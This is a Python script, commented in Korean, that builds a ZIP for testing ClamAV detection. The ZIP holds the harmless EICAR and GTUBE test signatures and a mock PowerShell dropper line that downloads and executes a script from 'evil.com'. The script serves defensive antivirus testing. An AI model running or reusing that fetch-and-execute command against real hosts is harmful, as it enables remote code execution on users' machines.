import zipfile
import os

# [ClamAV 테스트용 종합 감염 파일 생성 스크립트]

# 1. EICAR 표준 안티바이러스 테스트 서명 (100% 탐지 보장)
# - 시그니처 탐지 방식: 백신 데이터베이스에 등록된 68바이트 고정 문자열과 대조합니다.
EICAR_SIG = r'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# 2. GTUBE 표준 스팸 테스트 서명 (추가 탐지 포인트)
# - ClamAV는 바이러스뿐만 아니라 알려진 스팸 테스트 서명도 탐지할 수 있습니다.
GTUBE_SIG = r'XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X'

def create_master_infection_zip():
    """
    서명 매칭(Signature)과 행위 분석(Heuristic) 포인트를 모두 포함한 최종 테스트용 ZIP을 생성합니다.
    """
    try:
        # 스크립트 파일명을 따라 ZIP 파일명이 결정되도록 설정
        script_name = os.path.basename(__file__)
        zip_filename = script_name.replace(".py", ".zip")
        
        # 저장 경로 설정 (현재 스크립트 실행 위치)
        current_dir = os.path.dirname(os.path.abspath(__file__))
        zip_filepath = os.path.join(current_dir, zip_filename)

        print(f"[{zip_filename}] 생성 중...")

        # ZIP 파일을 메모리 기반으로 직접 생성 (OS의 실시간 감시 간섭 방지)
        with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zipf:
            
            # [탐지 1] 원본 EICAR 서명 파일 (ASCII 준수)
            # 가장 확실한 탐지 요소입니다.
            zipf.writestr("core_eicar_signature.txt", EICAR_SIG.encode('ascii'))
            
            # [탐지 2] 스팸 대응 엔진용 GTUBE 서명 파일
            # 추가적인 탐지 가능성을 제공합니다.
            zipf.writestr("extra_gtube_test.txt", GTUBE_SIG.encode('ascii'))
            
            # [탐지 3] 의심스러운 파워쉘 드롭퍼 코드
            # 서명 매칭이 아닌 코드의 의심스러운 행위(휴리스틱) 테스트용입니다.
            susp_ps1 = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malicious.ps1')"
            zipf.writestr("launcher_mock.ps1", susp_ps1.encode('utf-8'))
            
        print(f"✅ 감염 테스트 ZIP 생성 완료: {zip_filepath}")
        print("-" * 50)
        print("💡 결과 확인 안내 (EC2):")
        print(f"   - clamscan {zip_filename}  => 'FOUND' (정상 탐지)")
        print(f"   - clamscan --infected {zip_filename}  => 감염된 파일만 요약 출력")
        print("-" * 50)
        
    except Exception as e:
        print(f"❌ 생성 중 에러 발생: {e}")

if __name__ == "__main__":
    create_master_infection_zip()
